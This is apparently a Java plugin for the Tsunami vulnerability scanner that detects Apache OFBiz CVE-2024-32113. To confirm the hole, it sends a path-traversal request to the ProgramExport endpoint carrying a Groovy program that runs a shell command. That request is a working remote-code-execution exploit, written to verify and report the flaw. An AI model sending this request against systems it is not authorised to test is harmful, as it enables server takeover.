/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202432113;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URLEncoder;
import java.time.Clock;
import javax.inject.Inject;

/** Tsunami plugin for Apache OFBiz CVE-2024-32113. */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache OFBiz CVE-2024-32113 Detector",
    version = "0.1",
    description = "This plugin detects Apache OFBiz instances vulnerable to CVE-2024-32113.",
    author = "Ryan Beltran (ryanbeltran@google.com)",
    bootstrapModule = Cve202432113DetectorBootstrapModule.class)
public final class Cve202432113Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202432113Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Apache OFBiz CVE-2024-32113 Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUri + "webtools/control/forgotPassword/foo/../ProgramExport";

    Payload payload =
        payloadGenerator.generate(
            PayloadGeneratorConfig.newBuilder()
                .setInterpretationEnvironment(
                    PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
                .setExecutionEnvironment(
                    PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
                .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
                .build());

    String encodedGroovyProgram =
        URLEncoder.encode(
            "throw new Exception('" + payload.getPayload() + "'.execute().text);", UTF_8);

    try {
      HttpRequest req =
          HttpRequest.post(targetUri)
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
                      .build())
              .setRequestBody(ByteString.copyFromUtf8("groovyProgram=" + encodedGroovyProgram))
              .build();
      HttpResponse res = httpClient.send(req, networkService);
      return payload.checkIfExecuted(res.bodyBytes());

    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Failed to exploit '%s'. Maybe it is not vulnerable", targetUri);
      return false;
    }
  }

  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "GOOGLE";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "CVE-2024-32113 Remote code execution vulnerability in Apache OFBiz";

  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2024-32113";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      "The scanner detected that attackers can execute arbitrary code on the server via restricted"
          + " endpoints without authorization";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Upgrade to Apache OFBiz patched version 18.12.13.";

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(utcClock.instant().toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .addRelatedId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("CVE")
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}
